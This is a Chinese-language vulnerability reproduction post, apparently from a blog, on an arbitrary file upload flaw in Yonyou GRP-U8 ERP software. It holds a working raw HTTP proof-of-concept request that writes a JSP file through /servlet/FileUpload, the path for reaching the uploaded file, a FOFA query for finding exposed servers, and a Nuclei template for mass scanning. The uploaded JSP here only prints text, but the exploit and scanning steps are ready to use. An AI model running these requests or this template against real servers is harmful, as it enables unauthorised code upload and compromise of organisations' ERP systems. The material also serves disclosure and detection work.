# 原创
：  漏洞复现--用友GRP-U8-FileUpload任意文件上传

# 漏洞复现--用友GRP-U8-FileUpload任意文件上传

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

用友GRP-U8是一款功能全面、灵活度高、可定制性强的ERP软件，能够协助企业实现资源的高效管理，优化企业运营流程，提升整体管理水平。该产品存在任意文件上传漏洞。

### 二：漏洞影响版本

用友GRP-U8

### 三：网络空间测绘查询

fofa:<br/> ` app="用友-GRP-U8"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c7a590948a6d148bf52c79dceb19a632.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/687db010079708a1a4223ea17b510537.jpeg"/><br/> POC:

```
POST /servlet/FileUpload?fileName=test.jsp&amp;actionID=update HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0
Content-Length: 51
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close

&lt;% out.println("This page has a vulnerability!");%&gt;

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7f7012cd30dd4840fbfcd0d882efb407.jpeg"/><br/> 访问/R9iPortal/upload/test.jsp<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/09e837cc72cf83a70224552be46c7c61.jpeg"/>

### 五：批量检测

```
id: yonyou-grp-u8-fileupload

info:
  name: yonyou-grp-u8-fileupload
  author: 芝士土拨鼠
  severity: critical
  description: 用友GRP-U8是一款功能全面、灵活度高、可定制性强的ERP软件，能够协助企业实现资源的高效管理，优化企业运营流程，提升整体管理水平。该产品存在任意文件上传漏洞。
  metadata:
    max-request: 1
    fofa-query: app="用友-GRP-U8"
    verified: true
variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}"
  file_content: "{{to_lower(rand_text_alpha(20))}}"
requests:
  - raw:
      - |+
        POST /servlet/FileUpload?fileName={{file_name}}.jsp&amp;actionID=update HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Connection: close
        
        &lt;% out.println("{{file_content}}");%&gt;

      - |
        GET /R9iPortal/upload/{{file_name}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 &amp;&amp; status_code_2 == 200 &amp;&amp; contains(body_2, '{{file_content}}')"

```
